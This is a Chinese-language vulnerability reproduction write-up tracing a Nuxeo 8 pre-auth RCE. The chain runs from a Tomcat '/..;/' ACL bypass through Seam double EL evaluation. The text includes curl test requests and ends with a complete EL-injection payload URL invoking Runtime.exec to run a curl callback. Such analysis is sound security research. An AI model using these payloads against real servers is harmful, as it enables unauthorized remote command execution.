# 环境搭建

> 这个整个复现过程中耗时最多也是踩坑最多的地方，再最初的设想是从github下载7.10的分支代码然后利用IDEA本定运行起来调试，结果项目庞大，模块众多，根本跑不起来，一直耽搁了一两天，最后私信询问了orange，了解到他是直接使用的`docker`+`Eclipse Remote Debug`，配置好我的IDEA和docker后又发现代码出现了问题，不存在报告中的那个代码，经过@行军的提醒，应该是漏洞出现在8的分支上而非7,因此又重新`pull`8的docker环境，终于是成功跑起来了。

## docker:
```
docker pull nuxeo:8
```
`pull`下来后更改`/opt/nuxeo/server/bin/nuxeo.conf`
```
#JAVA_OPTS=$JAVA_OPTS -Xdebug -Xrunjdwp:transport=dt_socket,address=8787,server=y,suspend=n
```
取消这行的注释，在8787端口开放调式端口

## 源码：
调式需要与远程环境中的代码相同，因此直接拷贝出`docker`中的整个环境`/opt/nuxeo/server/`，将其中的`../nxserver/nuxeo.war`导入到`IDEA`中，将所有的`.jar`包导入，但是因为官方已经下架了`maven`上的`java`源码，因此还需要去`github`下载8分支的源码，然后作为`resource`

# 漏洞验证
因为`Breaking Parser Logic!`才是主角，因此来简单验证一下环境是否有漏洞，首先看一下`web.xml`中哪些目录是需要经过`NuxeoAuthenticationFilter`
```xml
<filter-mapping>
    <filter-name>NuxeoAuthenticationFilter
      </filter-name>
    <url-pattern>/oauthGrant.jsp</url-pattern>
    <dispatcher>REQUEST</dispatcher>
    <dispatcher>FORWARD</dispatcher>
</filter-mapping>
<filter-mapping>
    <filter-name>NuxeoAuthenticationFilter
      </filter-name>
    <url-pattern>/oauth/*</url-pattern>
    <dispatcher>REQUEST</dispatcher>
    <dispatcher>FORWARD</dispatcher>
</filter-mapping>
<filter-mapping>
    <filter-name>NuxeoAuthenticationFilter
      </filter-name>
    <url-pattern>/oauth2Grant.jsp</url-pattern>
    <dispatcher>REQUEST</dispatcher>
    <dispatcher>FORWARD</dispatcher>
</filter-mapping>
<filter-mapping>
    <filter-name>NuxeoAuthenticationFilter
      </filter-name>
    <url-pattern>/oauth2/*</url-pattern>
    <dispatcher>REQUEST</dispatcher>
    <dispatcher>FORWARD</dispatcher>
</filter-mapping>

........
```
随便挑选一个`oauth2Grant.jsp`，通过`curl`简单验证下漏洞
正常访问：
```
curl -I http://172.17.0.2:8080/nuxeo/oauth2Grant.jsp
```
返回：
```
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=10; IE=11
Cache-Control: no-cache
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *
X-XSS-Protection: 1; mode=block
Set-Cookie: JSESSIONID=F928CDFBD9BB1A54B03E380F1759731D.nuxeo; Path=/nuxeo/; HttpOnly
Location: http://172.17.0.2:8080/nuxeo/login.jsp?requestedUrl=oauth2Grant.jsp
Content-Length: 0
Date: Thu, 16 Aug 2018 09:17:05 GMT
```
验证：
```
curl -I http://172.17.0.2:8080/nuxeo/login.jsp;/..;/oauth2Grant.jsp
```
返回：
```
HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=10; IE=11
Cache-Control: no-cache
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *
X-XSS-Protection: 1; mode=block
Set-Cookie: JSESSIONID=7A751E09ED606C0EAEF4F615BC3F9330.nuxeo; Path=/nuxeo/; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 2396
Vary: Accept-Encoding
Date: Thu, 16 Aug 2018 09:16:54 GMT
Connection: close
```
正如原文所说的，出现`500`是因为`servlet`无法处理而已，但这也是绕过了`ACL`控制

# 怎样绕过的ACL
当一个验证的请求提交时，数据在经过`getRequestedPage`处理
因为`i`为9的原因，返回的值会是`login.jsp`，而他是在白名单里的，因此能够通过`bypassAuth`的检测，按照道理是没有问题的，因为在`nuxeo`中，不管你输入的是`/login.jsp;/..;/xxx.jsp`，最后也会因为检测问题，而只保留`login.jsp`
# tomcat??
`docker`环境用的`tomcat 7.0.69`，下载一份`tomcat`源码然后`choose source`，看一下，`tomcat`是如何处理这段请求的。
重新运行，查看到进入到`bypassAuth()`的值
```
 protected boolean bypassAuth(HttpServletRequest httpRequest) {
   //
}
```
再详细看一下`httpRequest`
* `unparsedURIMB`是`未经处理的URI`
* `uriMB`是`URI`
* `decodedUriMB`是经过转码后的`URI`
可以清晰的看到，在`tomcat`中，`/nuxeo/login.jsp;/..;/oauth2Grant.jsp`经过转码后成了`/nuxeo/oauth2Grant.jsp`，那么重新回过头来看一下关键地点
```
protected static String getRequestedPage(HttpServletRequest httpRequest) {
    String requestURI = httpRequest.getRequestURI();  //谁才是这个URI？？？？
    String context = httpRequest.getContextPath() + '/';
    String requestedPage = requestURI.substring(context.length());
    int i = requestedPage.indexOf(';');
    return i == -1 ? requestedPage : requestedPage.substring(0, i);
}
```
进入到函数中进行跟踪，最后在`org.apache.coyote.Request`的188行出现了答案，这是`nuxeo`选择处理的URI
```
    public MessageBytes requestURI() {
        return uriMB;
    }
```
## 到底访问的是谁？
`org.apache.jasper.servlet.JspServlet`的320行
```
                jspUri = request.getServletPath();
                String pathInfo = request.getPathInfo();
                if (pathInfo != null) {
                    jspUri += pathInfo;
```
看看`getServletPath()`
```
    public String getServletPath() {
        return (mappingData.wrapperPath.toString());
    }
```
在`mappingData`中，`wrapperPath`已经被确定为了`/oauth2Grant.jsp`，而`mappingData`属性是由`Mapper`类处理的，数据进入到`internalMapWrapper()`前路径已经发生了变化，那就查看调用栈
`postParseRequest()`有问题，跟进去看一下
```
connector.getMapper().map(serverName, decodedURI, version,
                                      request.getMappingData());
```
这儿进入到`map`的URI已经成了`/nuxeo/oauth2Grant.jsp`，那就向上看处理`convertURI(decodedURI, request);`，这是tomcat的解码函数，跟进去看下`ByteChunk bc = uri.getByteChunk();`
看一眼这个函数
```
    public ByteChunk getByteChunk() {
        return byteC;
    }
```
而`byteC`是`/nuxeo/oauth2Grant.jsp`，那就再看这个`byteC`怎么设置的，反复查看栈信息，在`normalize()`中`byteC`被修改成了`/nuxeo/oauth2Grant.jsp`，而需要注意一点的就是在刚进入这个函数时候`byteC`的值是`/nuxeo/login.jsp/../oauth2Grant.jsp`,那就继续往前看，发现在`parsePathParameters(req, request);`中`uriBC`(自己去看)会变成`/nuxeo/login.jsp/../oauth2Grant.jsp`，而再往前则是`decodedURI.duplicate(req.requestURI());`中创建：
```
ByteChunk bc=src.getByteChunk();
byteC.allocate( 2 * bc.getLength(), -1 );
byteC.append( bc );
break;
```
那么控制链就是：
`jspUri`<=`mappingData.wrapperPath`<=`internalMapWrapper()`<=`map()`<=`convertURI()`<=`byteC`<=`normalize()`<=`parsePathParameters()`<=`duplicate()`
而URL的变化则是
`/nuxeo/login.jsp;/..;/oauth2Grant.jsp`=>`nuxeo/login.jsp/../oauth2Grant.jsp`=>`nuxeo/oauth2Grant.jsp`
## 黑盒

`/..;/`，更详细的说明直接看PPT

# ACL分析完了，看代码重用了
`Seam`漏洞，看下以前的漏洞介绍，可以像orange说的一样，直接先定位到`callAction`，这函数下有两种调用方式:
* `actionOutcome`
* `actionMethod`
其中第一个就是曾经RCE漏洞的原因，而这次说的却是另一个`actionMethod`，这个函数也特别有意思，我刚开始也在想文中说的到底是什么意思，什么又得是一对，又得是真实存在，后来去跟的时候发现了，原来有个`if ( !SafeActions.instance().isActionSafe(actionId) ) return result;`，其中`isActionSafe()`的代码如下：
```
   public boolean isActionSafe(String id)
   {
      if ( safeActions.contains(id) ) return true;
      
      int loc = id.indexOf(':');
      if (loc<0) throw new IllegalArgumentException("Invalid action method " + id);
      String viewId = id.substring(0, loc);
      String action = "\"#{" + id.substring(loc+1) + "}\"";
......
```
大概内容就是和原文说的意思相同：
1. actionMethod的值必须是一对，例如：FILENAME：EL_CODE
2. FILENAME部分必须是context-root下的真实文件
3. 文件FILENAME必须包含内容“＃{EL_CODE}”（双引号是必需的）

这是什么意思呢？简单来说，就是这个东西不允许外部输入EL，但是却允许去调用内部文件中已经写好的EL，这儿确没什么问题，除非是开发者故意在文件中写恶意EL，否则我们怎么都不可能攻击成功.

# Double evaluation
我也以`login.xhtml`为例子，先动态追踪下再说，我应该和orange的环境有些许偏差，所以我的文件内容是这样的：
```
        <tr>
          <td><label for="username">Input User Name: </label></td>
          <td><h:inputText name="j_username" value="#{userDTO.username}" /></td>
        </tr>
        <tr>
          <td><label for="password">Password: </label></td>
          <td><h:inputSecret name="j_password"
            value="#{userDTO.password}" /></td>
        </tr>
```
那么构造的url就是：
`http://172.17.0.2:8080/nuxeo/login.jsp;/..;/create_file.xhtml?actionMethod=login.xhtml:userDTO.username`
有些惊讶的发现就是数据在708行时候跳走了
```
outcome = toString( actionExpression.invoke() );
```
然后就进入到了异常，就在数据进入到`handleOutcome(facesContext, outcome, fromAction);`之前发生异常值得思考，因为上一个进入到里面的是JBOSS Seam框架远程代码执行漏洞，重新读一下这四行代码：
```
MethodExpression actionExpression = Expressions.instance().createMethodExpression(expression);
outcome = toString( actionExpression.invoke() );
fromAction = expression;
handleOutcome(facesContext, outcome, fromAction);
```
倘若代码没有报错，那字符串就会进入到`handleOutcome`，那如果返回的是一个EL的字符串，就也会被执行了，这儿可以自己创建XHTML去观察调用栈，我决定跳过这段分析，因为不重要。
只需要知道我们如果能让初次执行的EL返回一个EL样子的字符串就行了。

不知道orange是怎么发现的`widgets/suggest_add_new_directory_entry_iframe.xhtml`，这个效果是这样的，它可以返回一个可控制的字符串，就是说我们可以控制在代码中`actionExpression.invoke() `的结果，那就相当于是EL注入了。
到这为止的POC是：
```
http://host/nuxeo/login.jsp;/..;/whatever.xhtml?actionMethod=widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')&directoryNameForPopup=/?#{EL}
```
# Bypass

这儿没什么可说的，简单的黑名单字符串匹配导致的绕过，改一下写法就行，如`"".getClass()`改成`"".["class"]`。再往后就是EL注入的内容了

#Payload
这儿踩坑了，我一开始是直接用的orange的payload，结果炸了，我后跟了好几次数据，我不清楚是不是环境问题，我的环境在`FacesMnager`中有个检查
```
         StringTokenizer tokens = new StringTokenizer( url.substring(loc), "?=&" );
         while ( tokens.hasMoreTokens() )
         {
            String name = tokens.nextToken();
            if (tokens.hasMoreTokens())
            {
               String value = Interpolator.instance().interpolate( tokens.nextToken() );
               parameters.put(name, value);
            }
            
         }
```
orange的payload在我这能过`while`却过不了`if`，也就是说到不了`interpolate()`中，我只能硬着头皮重新构造，将`/?=#{}`改成`/?=/=#{}`成功绕过了
这儿绕过去后面又发现怎么都无法执行EL，整整墨迹了一个多小时，又和@行军本地搭建调试了EL，发现都没什么问题，最后借鉴了[JBOSS Seam框架远程代码执行漏洞](http://www.voidcn.com/article/p-ohiqbrje-sh.html)，从定位接口开始，定位出`java.lang.getRuntime()`和`java.lang.Runtime.exec()`，然后直接合并进行EL注入，最后的成品payload:
```
http://172.17.0.2:8080/nuxeo/login.jsp;/..;/create_file.xhtml?actionMethod=widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')&directoryNameForPopup=%2f%3f%3d%2f%3d%23{''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')}
```